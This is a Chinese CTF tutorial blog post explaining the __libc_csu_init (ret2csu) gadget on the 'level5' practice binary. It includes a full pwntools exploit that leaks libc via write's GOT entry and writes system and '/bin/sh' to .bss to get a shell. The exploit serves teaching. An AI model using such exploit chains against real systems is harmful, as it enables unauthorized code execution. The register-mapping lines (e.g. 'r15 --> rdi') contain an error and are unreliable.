---
layout:     post   				    # 使用的布局（不需要改）
title:      pwn__libc_csu_init通用gadget学习 		 # 标题 
subtitle:   pwn_libc_csu_init               # 副标题
date:       2018-07-15 				# 时间
author:     Mr.R 					# 作者
# header-img: img/post-bg-2015.jpg 	# 这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								# 标签
    - CTF
    - PWN
---

# PWN,__libc_csu_init通用gadget学习
>例题下载:[蒸米level5](/files/pwn/level5)

__libc_csu_init函数是在libc初始化的时候用到的函数,所以在使用libc的文件中都会出现他  
  
在做64位的pwn题目的时候,函数的传参都是需要用到寄存器的  
>从第⼀一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9。从第7个参数开始，接下来的所有参数都将通过栈传递  

但是我们在rop的时候不一定可以控制全部的寄存器,可能会导致参数无法完全传递,这时候就可以利用__libc_csu_init来进行调用函数

首先来看函数的汇编  
```
.text:00000000004005A0 ; void _libc_csu_init(void)
.text:00000000004005A0                 public __libc_csu_init
.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004005A0
.text:00000000004005A0 var_30          = qword ptr -30h
.text:00000000004005A0 var_28          = qword ptr -28h
.text:00000000004005A0 var_20          = qword ptr -20h
.text:00000000004005A0 var_18          = qword ptr -18h
.text:00000000004005A0 var_10          = qword ptr -10h
.text:00000000004005A0 var_8           = qword ptr -8
.text:00000000004005A0
.text:00000000004005A0 ; __unwind {
.text:00000000004005A0                 mov     [rsp+var_28], rbp
.text:00000000004005A5                 mov     [rsp+var_20], r12
.text:00000000004005AA                 lea     rbp, cs:600E24h
.text:00000000004005B1                 lea     r12, cs:600E24h
.text:00000000004005B8                 mov     [rsp+var_18], r13
.text:00000000004005BD                 mov     [rsp+var_10], r14
.text:00000000004005C2                 mov     [rsp+var_8], r15
.text:00000000004005C7                 mov     [rsp+var_30], rbx
.text:00000000004005CC                 sub     rsp, 38h
.text:00000000004005D0                 sub     rbp, r12
.text:00000000004005D3                 mov     r13d, edi
.text:00000000004005D6                 mov     r14, rsi
.text:00000000004005D9                 sar     rbp, 3
.text:00000000004005DD                 mov     r15, rdx
.text:00000000004005E0                 call    _init_proc
.text:00000000004005E5                 test    rbp, rbp
.text:00000000004005E8                 jz      short loc_400606
.text:00000000004005EA                 xor     ebx, ebx
.text:00000000004005EC                 nop     dword ptr [rax+00h]
.text:00000000004005F0
.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j
.text:00000000004005F0                 mov     rdx, r15
.text:00000000004005F3                 mov     rsi, r14
.text:00000000004005F6                 mov     edi, r13d
.text:00000000004005F9                 call    qword ptr [r12+rbx*8]
.text:00000000004005FD                 add     rbx, 1
.text:0000000000400601                 cmp     rbx, rbp
.text:0000000000400604                 jnz     short loc_4005F0
.text:0000000000400606
.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j
.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]
.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]
.text:0000000000400610                 mov     r12, [rsp+38h+var_20]
.text:0000000000400615                 mov     r13, [rsp+38h+var_18]
.text:000000000040061A                 mov     r14, [rsp+38h+var_10]
.text:000000000040061F                 mov     r15, [rsp+38h+var_8]
.text:0000000000400624                 add     rsp, 38h
.text:0000000000400628                 retn
.text:0000000000400628 ; } // starts at 4005A0
.text:0000000000400628 __libc_csu_init endp
```
需要注意的是 每个不同版本的 汇编可能都不同

下面来看分析  
显然在0x0400606之后我们可以控制rbx,rbp,r12,r13,r14,r15  
在0x04005F0中
```
r15 --> rdi  
r14 --> rsi
r13 --> edi
```
这里要注意的是 虽然只能够控制rdi的低32位,但实际上rdi的高32位也是0(可以自行调试)
在这里我们就可以控制rdi,rsi,rdi。并且可以调用r12所指的函数(要注意调用时要使用got地址)  

```
.text:00000000004005FD                 add     rbx, 1
.text:0000000000400601                 cmp     rbx, rbp
.text:0000000000400604                 jnz     short loc_4005F0
```
这一处我们只需要使rbx + 1 = rbp就可以了  
我们就使用最简单的rbx = 0,rbp = 1  
  
溢出函数:
```c
ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  return read(0, &buf, 0x200uLL);
}
```

payload编写:  
1. 确定padding:0x88  
2. 编写csu利用函数


```python
def csu(rbx,rbp,r12,r13,r14,r15):
    payload = padding + p64(csu_end)
    payload += p64(0)   #覆盖rsp->rsp+8
    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    payload += p64(csu_start)
    payload += 'A'*(7*8)
    payload += p64(main)
    s.sendline(payload)
```

这里需要注意 我们在覆盖完ret后,要先写入8字节将rsp覆盖到rsp+8。在控制完rbx,rbp等以后跳转到上方调用函数。在调用完之后,我们仍然需要覆盖ret,所以要往stack上继续覆盖8*8*7字节(6个寄存器+1个垃圾字节),因为要多次利用,所以要将ret覆盖为main

3. 利用write,leak出偏移地址
```python
write_got = elf.got['write']
csu(0,1,write_got,1,write_got,8)
s.recvline()
write_real = u64(s.recvline()[0:8])
libc = LibcSearcher("write",write_real)
offset = write_real - libc.dump("write")
```

4. 将system地址与/bin/sh写入bss  
   因为我们没有system_got的地址,所以我们需要首先把system_symbols写入bss,然后再通过csu调用bss来执行
```python
read_got = elf.got['read']
bss = 0x601038
csu(0,1,read_got,0,bss,16)
system = libc.dump("system") + offset
sleep(1)
s.send(p64(system))
s.send("/bin/sh\x00")
```
这里记得手动延时一下,不然可能会出现程序还没read,我们数据就已经发上去的情况

5. 调用system,GetShell
```python
csu(0,1,bss,bss+8,0,0)
s.interactive()
```

完整code:
```python
#-*-coding=utf-8-*-

from pwn import *
from LibcSearcher import LibcSearcher
from time import sleep

s = process("./level5")
elf = ELF("./level5")
padding = 'A'*0x88
csu_end = 0x0400606
csu_start = 0x04005F0
main = 0x0400564

def csu(rbx,rbp,r12,r13,r14,r15):
    payload = padding + p64(csu_end)
    payload += p64(0)   #覆盖rsp->rsp+8
    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    payload += p64(csu_start)
    payload += '\x00'*(7*8)
    payload += p64(main)
    s.sendline(payload)

write_got = elf.got['write']
csu(0,1,write_got,1,write_got,8)
s.recvline()
write_real = u64(s.recvline()[0:8])
libc = LibcSearcher("write",write_real)
offset = write_real - libc.dump("write")

read_got = elf.got['read']
bss = 0x601038
system_addr = libc.dump("system") + offset
csu(0,1,read_got,0,bss,16)
sleep(1)
s.send(p64(system_addr))
s.send("/bin/sh\0")
print "send success"
csu(0,1,bss,bss+8,0,0)
s.interactive()
```


